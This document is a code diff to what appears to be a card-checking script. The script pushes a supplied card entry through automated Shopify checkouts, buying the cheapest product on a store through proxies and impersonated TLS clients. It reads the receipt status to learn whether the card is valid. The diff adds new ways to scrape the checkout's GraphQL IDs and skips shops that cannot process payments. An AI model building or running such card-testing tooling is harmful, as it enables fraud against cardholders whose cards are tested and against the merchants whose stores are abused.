@@ -64,6 +64,10 @@ patch_payload = _auto.patch_payload
 check_submit_errors = _auto.check_submit_errors
 generate_attempt_token = _auto.generate_attempt_token
 generate_page_id = _auto.generate_page_id
+extract_all_js_candidates = _auto.extract_all_js_candidates
+find_graphql_ids_in_html_and_js = _auto.find_graphql_ids_in_html_and_js
+is_development_shop = _auto.is_development_shop
+has_no_payment_gateways = _auto.has_no_payment_gateways
 
 MIN_PRODUCT_PRICE = _auto.MIN_PRODUCT_PRICE
 MAX_PRODUCT_PRICE = _auto.MAX_PRODUCT_PRICE
@@ -929,6 +933,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
     client = AsyncTLSClient(timeout=12, proxy_url=proxy_url,
                             impersonate=impersonate, user_agent=user_agent)
     try:
+        # ─── Step 0: cheapest product ─────────────────────
         try:
             title, product_id, product_handle, variant_id, price = await find_cheapest_product(
                 client, shop_url, MIN_PRODUCT_PRICE, MAX_PRODUCT_PRICE
@@ -940,6 +945,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error = Exception(f"Step 0 failed: {e}")
             return result
 
+        # ─── Step 1: cart → checkout ──────────────────────
         try:
             checkout_url, checkout_token, session_token, checkout_html = \
                 await add_to_cart_and_checkout(client, shop_url, variant_id, product_id, product_handle)
@@ -954,6 +960,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error = Exception(f"Step 1 failed: {e}")
             return result
 
+        # ─── Step 2: private access token ─────────────────
         try:
             pat_id = extract_private_access_token_id(checkout_html)
             if not pat_id:
@@ -965,15 +972,46 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error = Exception(f"Step 2 failed: {e}")
             return result
 
+        # ─── Step 3: find GraphQL IDs ─────────────────────
         try:
+            # فحص development shop + gateways قبل أي حاجة
+            if is_development_shop(checkout_html):
+                result.status = CheckStatus.ERROR
+                result.retryable = False
+                result.error = Exception("development shop — checkout disabled by Shopify")
+                return result
+
+            if has_no_payment_gateways(checkout_html):
+                result.status = CheckStatus.ERROR
+                result.retryable = False
+                result.error = Exception("no payment gateways available")
+                return result
+
+            proposal_id = ""
+            submit_id = ""
+
+            # المحاولة 1: actions.js القديم
             actions_url = extract_actions_js_url(checkout_html, shop_url)
-            if not actions_url:
-                raise Exception("could not find actions JS URL")
-            js_body     = await fetch_actions_js(client, actions_url, shop_url)
-            proposal_id = extract_proposal_id(js_body)
-            submit_id   = extract_submit_for_completion_id(js_body)
+            if actions_url and "actions" in actions_url:
+                try:
+                    js_body = await fetch_actions_js(client, actions_url, shop_url)
+                    proposal_id = extract_proposal_id(js_body)
+                    submit_id = extract_submit_for_completion_id(js_body)
+                except Exception:
+                    pass
+
+            # المحاولة 2: الطريقة الجديدة (import map)
             if not proposal_id or not submit_id:
-                raise Exception("missing Proposal or Submit ID")
+                proposal_id, submit_id = await asyncio.to_thread(
+                    find_graphql_ids_in_html_and_js, client, checkout_html, shop_url
+                )
+
+            if not proposal_id or not submit_id:
+                result.status = CheckStatus.ERROR
+                result.retryable = True
+                result.error = Exception("could not find Proposal/SubmitForCompletion IDs in any JS file")
+                return result
+
             poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
         except Exception as e:
             result.status = CheckStatus.ERROR
@@ -981,6 +1019,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error = Exception(f"Step 3 failed: {e}")
             return result
 
+        # ─── Step 4: Proposal 1 ───────────────────────────
         try:
             _, proposal_body = await send_proposal(
                 client, shop_url, checkout_url, checkout_token, session_token,
@@ -1005,6 +1044,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error = Exception(f"Step 4 failed: {e}")
             return result
 
+        # ─── Step 5: Proposal 2 (email) ───────────────────
         try:
             _, proposal2_body = await send_proposal2(
                 client, shop_url, checkout_url, checkout_token, session_token,
@@ -1018,6 +1058,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error = Exception(f"Step 5 failed: {e}")
             return result
 
+        # ─── Step 6: Proposal 3 (address) ─────────────────
         try:
             addr = address_for_country(country)
             _, proposal3_body = await send_proposal3(
@@ -1032,6 +1073,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error = Exception(f"Step 6 failed: {e}")
             return result
 
+        # ─── Step 7: Proposal 4 ───────────────────────────
         try:
             _, proposal4_body = await send_proposal3(
                 client, shop_url, checkout_url, checkout_token, session_token,
@@ -1045,6 +1087,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error = Exception(f"Step 7 failed: {e}")
             return result
 
+        # ─── Step 8: Proposal 5 ───────────────────────────
         try:
             proposal5_status, proposal5_body = await send_proposal3(
                 client, shop_url, checkout_url, checkout_token, session_token,
@@ -1056,6 +1099,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error = Exception(f"Step 8 failed: {e}")
             return result
 
+        # ─── Gateways ─────────────────────────────────────
         try:
             gateways = extract_payment_gateways(proposal5_body)
             if gateways:
@@ -1068,6 +1112,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
         except Exception:
             pass
 
+        # ─── Step 9: PCI session ──────────────────────────
         try:
             ident_sig = extract_identification_signature(checkout_html)
             if not ident_sig:
@@ -1085,6 +1130,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error = Exception(f"Step 9 failed: {e}")
             return result
 
+        # ─── Step 10: prepare + submit ────────────────────
         try:
             queue_token5 = extract_queue_token(proposal5_body)
             if not queue_token5:
@@ -1168,6 +1214,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error  = e
             return result
 
+        # ─── Poll for receipt ─────────────────────────────
         poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
         type_name_re  = re.compile(
             r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
@@ -1242,7 +1289,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
                 result.error  = Exception(f"poll {poll_num} failed: {e}")
                 return result
 
-        # ✅ خلصت المحاولات ولسه ProcessingReceipt → ERROR + retry
+        # خلصت المحاولات ولسه ProcessingReceipt → ERROR + retry
         result.status      = CheckStatus.ERROR
         result.status_code = "PROCESSING"
         result.error       = Exception("PROCESSING")
